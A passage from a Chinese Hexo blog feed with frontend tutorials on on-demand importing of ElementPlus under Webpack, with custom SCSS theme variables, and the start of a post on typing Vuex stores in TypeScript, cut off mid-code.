class="built_in">mv</span> node_modules node_modules.nosync</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 node_modules 软链</span></span><br><span class="line"><span class="built_in">ln</span> -s node_modules.nosync/ node_modules</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Obsidian </tag>
            
            <tag> 自动化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ElementPlus Webpack 下按需引入</title>
      <link href="/2022/07/918f1a0f646e.html"/>
      <url>/2022/07/918f1a0f646e.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-引入方案"><a href="#1-引入方案" class="headerlink" title="1. 引入方案"></a>1. 引入方案</h1><p>官方说明：<a href="https://element-plus.gitee.io/zh-CN/guide/quickstart.html#%E6%8C%89%E9%9C%80%E5%AF%BC%E5%85%A5">链接</a></p><p>我们需要在 Webpack 配置里添加两个 Plugin：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> autoImport <span class="keyword">from</span> <span class="string">&#x27;unplugin-auto-import/webpack&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> components <span class="keyword">from</span> <span class="string">&#x27;unplugin-vue-components/webpack&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">ElementPlusResolver</span> <span class="keyword">as</span> elementPlusResolver&#125; <span class="keyword">from</span> <span class="string">&#x27;unplugin-vue-components/resolvers&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="attr">plugins</span>: [</span><br><span class="line"><span class="title function_">autoImport</span>(&#123;</span><br><span class="line"><span class="attr">resolvers</span>: [<span class="title function_">elementPlusResolver</span>()],</span><br><span class="line">&#125;),</span><br><span class="line"><span class="title function_">components</span>(&#123;</span><br><span class="line"><span class="attr">resolvers</span>: [</span><br><span class="line"><span class="title function_">elementPlusResolver</span>(),</span><br><span class="line">],</span><br><span class="line">&#125;),</span><br><span class="line">],</span><br></pre></td></tr></table></figure><h2 id="1-1-unplugin-auto-import"><a href="#1-1-unplugin-auto-import" class="headerlink" title="1.1 unplugin-auto-import"></a>1.1 unplugin-auto-import</h2><blockquote><p><a href="https://github.com/antfu/unplugin-auto-import">https://github.com/antfu/unplugin-auto-import</a></p></blockquote><p><code>autoImport</code> 是用来帮助我们自动引用 Element 组件的，当你在 vue 组件里编写入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-button</span>&gt;</span>你这瓜多少钱一斤<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">&quot;ts&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;&#125;;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么经过编译后，<code>autoImport</code> 会自动帮我们吧 ElButton 组件给引入，那么代码就会成为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-button</span>&gt;</span>你这瓜多少钱一斤<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">&quot;ts&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="string">&quot;ElButton&quot;</span> <span class="keyword">from</span> <span class="string">&quot;element-plus&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;&#125;;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但这时候代码还不能使用，因为 <code>defineComponent</code> 的 <code>components</code> 中还没有定义 ElButton 组件，此时我们就需要使用 unplugin-vue-components</p><h2 id="1-2-unplugin-vue-components"><a href="#1-2-unplugin-vue-components" class="headerlink" title="1.2 unplugin-vue-components"></a>1.2 unplugin-vue-components</h2><blockquote><p><a href="https://github.com/antfu/unplugin-vue-components">https://github.com/antfu/unplugin-vue-components</a></p></blockquote><p>unplugin-vue-components 导出的 <code>components</code> 可以帮我们自动定义组件中用到的子组件，承接前面的代码，使用了 unplugin-vue-components 后，代码就会被编译为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-button</span>&gt;</span>你这瓜多少钱一斤<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">&quot;ts&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="string">&quot;ElButton&quot;</span> <span class="keyword">from</span> <span class="string">&quot;element-plus&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">component</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title class_">ElButton</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;&#125;;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 但是此时只是导入了组件，组件的样式还没有被引入，这时候就需要 unplugin-vue-components/resolvers 下导出的 <code>ElementPlusResolver</code> 了。</p><p> <code>ElementPlusResolver</code> 提供了组件标签和组件引入位置的映射关系，因此我们需要将其作为 resolver 传入前面提到的<code>autoImport</code> 和 <code>componet</code> 两个插件中，这样两个插件才知道我们在 template 里面写的组件标签需要引用到哪些组件，然后来帮我们引入和声明。</p><p> 除此之外，<code>ElementPlusResolver</code> 还可以帮我们自动引入组件的样式，通过配置它的 <code>importStyle</code> 配置项，我们还可以禁用这个功能，或者让其引入 css 文件（默认）或者 scss 文件。</p><p> 使用了 <code>ElementPlusResolver</code> 后，代码就会被编译为：</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-button</span>&gt;</span>你这瓜多少钱一斤<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">&quot;ts&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="string">&quot;ElButton&quot;</span> <span class="keyword">from</span> <span class="string">&quot;element-plus&quot;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="string">&#x27;element-plus/es/components/button/style/css&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">component</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title class_">ElButton</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;&#125;;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此外，在项目里如果你的一些全局组件放在 <code>src/components</code> 目录下，当你在其他组件中使用时，unplugin-vue-components 也会自动将这些组件自动引入并声明。</p><p>同时 unplugin-vue-components 自动导入的组件也是支持 typescript 的，将 <code>component</code> 插件的 <code>dts</code> 属性设置为 true 后，会在项目根目录生成一个 <code>components.d.ts</code> 文件，如果你的编辑器使用了 volar，并且把这个 dts 文件添加 tsconfig 文件之后，在使用这些被自动引入的组件时便会出现 ts 提示。</p><blockquote><p>这里不建议将业务组件也完全依赖自动引入，因为不同模块间的业务组件可能存在同名情况。</p></blockquote><h1 id="2-按需引入时，如何自定义样式"><a href="#2-按需引入时，如何自定义样式" class="headerlink" title="2. 按需引入时，如何自定义样式"></a>2. 按需引入时，如何自定义样式</h1><p>自定义相关的样式，ElementPlus 官网的说明很少，但是从源码里可以翻到一个 README：<a href="https://github.com/element-plus/element-plus/blob/1.1.0-beta.20/docs/en-US/guide/theming.md">https://github.com/element-plus/element-plus/blob/1.1.0-beta.20/docs/en-US/guide/theming.md</a></p><p>按照上面的说明我们需要创建一个样式文件，并将其放在 <code>stlye/element-variable.scss</code> 目录下：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// README: https://github.com/element-plus/element-plus/blob/1.1.0-beta.20/docs/en-US/guide/theming.md</span></span><br><span class="line"><span class="keyword">@forward</span> <span class="string">&quot;element-plus/theme-chalk/src/common/var.scss&quot;</span> with (</span><br><span class="line">// 注意：<span class="number">1.2</span>.<span class="number">0</span>+ 移除了 IconFont，不要按照原文 Demo 中添加 <span class="variable">$font-path</span> 变量</span><br><span class="line">    // <span class="variable">$font-path</span>: <span class="string">&#x27;~element-plus/dist/fonts&#x27;</span>,</span><br><span class="line">    // 主题颜色</span><br><span class="line">    <span class="variable">$colors</span>: (</span><br><span class="line">        <span class="string">&#x27;primary&#x27;</span>: (</span><br><span class="line">            <span class="string">&#x27;base&#x27;</span>: <span class="number">#303CB9</span>,</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span>: (</span><br><span class="line">            <span class="string">&#x27;base&#x27;</span>: <span class="number">#67c23a</span></span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&#x27;warning&#x27;</span>: (</span><br><span class="line">            <span class="string">&#x27;base&#x27;</span>: <span class="number">#e6a23c</span></span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&#x27;danger&#x27;</span>: (</span><br><span class="line">            <span class="string">&#x27;base&#x27;</span>: <span class="number">#ed3637</span></span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span>: (</span><br><span class="line">            <span class="string">&#x27;base&#x27;</span>: <span class="number">#f56c6c</span></span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&#x27;info&#x27;</span>: (</span><br><span class="line">            <span class="string">&#x27;base&#x27;</span>: <span class="number">#909399</span></span><br><span class="line">        ),</span><br><span class="line">    ),</span><br><span class="line">    // 字体颜色</span><br><span class="line">    <span class="variable">$text-color</span>: (</span><br><span class="line">        <span class="string">&#x27;primary&#x27;</span>: <span class="number">#1D2024</span>,</span><br><span class="line">        <span class="string">&#x27;regular&#x27;</span>: <span class="number">#505255</span>,</span><br><span class="line">        <span class="string">&#x27;secondary&#x27;</span>: <span class="number">#C0C4CC</span>,</span><br><span class="line">        <span class="string">&#x27;placeholder&#x27;</span>: <span class="number">#C0C4CC</span>,</span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"><span class="comment">// 因为我们采用按需引入方式来引入组件，因此不要全局引入样式文件</span></span><br><span class="line"><span class="comment">// @use &quot;~element-plus/theme-chalk/src/index&quot;;</span></span><br></pre></td></tr></table></figure><p>然后在 Vue 入口文件 main.ts 里引入：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;@/stlye/element-variable.scss&quot;</span></span><br></pre></td></tr></table></figure><p>之后我们便会发现，并没有什么用 … … 定义的变量并没有生效。</p><p>其实经过分析 unplugin-auto-import 和 unplugin-vue-components 的自动引入组件原理后，我们不难发现两个插件帮我们引入的组件样式实际上是在 <strong>组件内部生效的</strong>，然而我们定义的变量文件却是在入口文件引入的，因此组件内部引入的哪些样式是取不到我们这里定义的全局变量的。</p><p>那么，怎么才能生效呢？我们不妨来想一下如果你定义了一个样式文件（variable.scss）来存储变量信息，你要怎么在其他样式文件中使用这个样式文件呢？没错，就是在其他文件内引入 <code>variable.scss</code>，就像这样：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@use</span> <span class="string">&quot;@/style/variables.scss&quot;</span> as *;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">backgournd: <span class="variable">$-bg-color</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>沿着这个思路，我们只要想办法将 <code>@use &quot;@/stlye/element-variable.scss&quot; as *;</code> 塞入每个 ElementPlus 组件的 scss 样式文件的第一行中就可以了。</p><p><code>sass-loader</code> 正好提供了一个 <code>additionalData</code> 配置项，可以帮助们我们来将一些信息写入到每个 scss 文件中，因此我们需要在 webpack 的 scss loader 部分配置为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">test</span>: <span class="regexp">/\.scss$/</span>,</span><br><span class="line"><span class="attr">use</span>: [</span><br><span class="line">process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;development&#x27;</span> ? <span class="string">&#x27;vue-style-loader&#x27;</span> : <span class="title class_">MiniCssExtractPlugin</span>.<span class="property">loader</span>,</span><br><span class="line"><span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;postcss-loader&#x27;</span>,</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">loader</span>: <span class="string">&#x27;sass-loader&#x27;</span>,</span><br><span class="line"><span class="attr">options</span>: &#123;</span><br><span class="line">    <span class="attr">additionalData</span>: <span class="string">&#x27;@use &quot;@/stlye/element-variable.scss&quot; as *;&#x27;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&#x27;css-unicode-loader&#x27;</span>,</span><br><span class="line">],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>同时，因为 <code>ElementPlusResolver</code> 默认引入的是 ElementPlus 中的 css 文件，我们需要让其引入 scss 文件行，我们还需要将 plugin 做一下改造：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">autoImport(&#123;</span><br><span class="line">resolvers: [</span><br><span class="line"><span class="deletion">-elementPlusResolver()</span></span><br><span class="line"><span class="addition">+elementPlusResolver(&#123;</span></span><br><span class="line"><span class="addition">+importStyle: &#x27;sass&#x27;,</span></span><br><span class="line"><span class="addition">+&#125;),</span></span><br><span class="line">],</span><br><span class="line">&#125;),</span><br><span class="line">components(&#123;</span><br><span class="line">resolvers: [</span><br><span class="line"><span class="deletion">-elementPlusResolver(),</span></span><br><span class="line"><span class="addition">+elementPlusResolver(&#123;</span></span><br><span class="line"><span class="addition">+importStyle: false, // 两个 elementPlusResolver 都会自动引入样式文件，可以关闭一个</span></span><br><span class="line"><span class="addition">+&#125;),</span></span><br><span class="line">],</span><br><span class="line">&#125;),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>之后我们定义的 ElementPlus 变量就可以完美使用了。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
            <tag> Vue </tag>
            
            <tag> Element-Plus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vuex Typescript 支持</title>
      <link href="/2022/07/f672fc109ff3.html"/>
      <url>/2022/07/f672fc109ff3.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a>1. 定义</h1><h2 id="1-1-定义入口模块"><a href="#1-1-定义入口模块" class="headerlink" title="1.1 定义入口模块"></a>1.1 定义入口模块</h2><p>入口 <code>/src/store/index.ts</code> :</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123;<span class="title class_">InjectionKey</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;createStore, <span class="title class_">Store</span>, useStore <span class="keyword">as</span> baseUseStore&#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span>;</span><br><span class="line"><span class="comment">// 引入子模块</span></span><br><span class="line"><span class="keyword">import</span> createUserState, &#123;<span class="title class_">IUserState</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;./user&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">IRootState</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">IModuleState</span> &#123;</span><br><span class="line">    <span class="attr">user</span>: <span class="title class_">IUserState</span>;</span><br><span class="line"><span class="comment">// other modules</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="attr">storeInjectionKey</span>: <span class="title class_">InjectionKey</span>&lt;<span class="title class_">Store</span>&lt;<span class="title class_">IRootState</span> &amp; <span class="title class_">IModuleState</span>&gt;&gt; = <span class="title class_">Symbol</span>(<span class="string">&#x27;storeInjectionKey&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">initStore</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> createStore&lt;<span class="title class_">IRootState</span>&gt;(&#123;</span><br><span class="line">        <span class="attr">state</span>: &#123;&#125;,</span><br><span class="line">        <span class="attr">mutations</span>: &#123;&#125;,</span><br><span class="line">        <span class="attr">actions</span>: &#123;&#125;,</span><br><span class="line">        <span class="attr">modules</span>: &#123;</span><br><span class="line">            <span class="attr">user</span>: <span class="title function_">createUserState</span>(),</span><br><span class="line"><span class="comment">// other modules</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义自己的 `useStore` 组合式函数</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">useStore</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">baseUseStore</span>(storeInjectionKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-定义子模块"><a href="#1-2-定义子模块" class="headerlink" title="1.2 定义子模块"></a>1.2 定义子模块</h2><p>User 模块 <code>/src/store/user.ts</code> :</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123;<span class="title class_">InjectionKey</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Store</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123;<span class="title class_">Module</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">IRootState</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;getUserDetail, getUserStatus&#125; <span class="keyword">from</span> <span class="string">&#x27;@/base/api/user&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="variable constant_">IS_NODE</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;@/base/utils&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">IUserDetail</span> &#123;</span><br><span class="line">    id?: <span class="built_in">number</span>;</span><br><span class="line">    ucid?: <span class="built_in">string</span>;</span><br><span class="line">    unfinished_orders_num?: <span class="built_in">number</span>;</span><br><span class="line">    orders_num?: <span class="built_in">number</span>;</span><br><span class="line">    has_saas?: <span class="built_in">boolean</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 UserState 的接口</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">IUserState</span> &#123;</span><br><span class="line">    <span class="attr">isLogin</span>: <span class="built_in">boolean</span>;</span><br><span class="line">    ucid?: <span class="built_in">string</span>;</span><br><span class="line">    ucname?: <span class="built_in">string</span>;</span><br><span class="line">    loginType?: <span class="string">&#x27;uc&#x27;</span>;</span><br><span class="line">    detail?: <span class="title class_">IUserDetail</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可选</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="attr">storeUserKey</span>: <span class="title class_">InjectionKey</span>&lt;<span class="title class_">Store</span>&lt;<span class="title class_">IUserState</span>&gt;&gt; = <span class="title class_">Symbol</span>(<span class="string">&#x27;storeUserKey&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导出一个创建 State Module 的方法，防止在 SSR 场景下每个请求都使用同一个实例</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createUserState</span>(<span class="params"></span>): <span class="title class_">Module</span>&lt;<span class="title class_">IUserState</span>, <span class="title class_">IRootState</span>&gt; &#123;</span><br><span class="line">    <span class="attr">namespaced</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">state</span>: <span class="function">() =&gt;</span> (&#123;</span><br><span class="line">        <span class="attr">isLogin</span>: <span class="literal">false</span>,</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="attr">mutations</span>: &#123;</span><br><span class="line">        <span class="title function_">setLoginStatus</span>(<span class="params">state, payload</span>) &#123;</span><br><span class="line">            state.<span class="property">isLogin</span> = payload.<span class="property">isLogin</span>;</span><br><span class="line">            state.<span class="property">loginType</span> = payload.<span class="property">loginType</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">setLoginInfo</span>(<span class="params">state, payload</span>) &#123;</span><br><span class="line">            state.<span class="property">ucid</span> = payload.<span class="property">ucid</span>;</span><br><span class="line">            state.<span class="property">ucname</span> = payload.<span class="property">ucname</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">setUserDetail</span>(<span class="params">state, payload</span>) &#123;</span><br><span class="line">            state.<span class="property">detail</span> = payload;</span><br><span 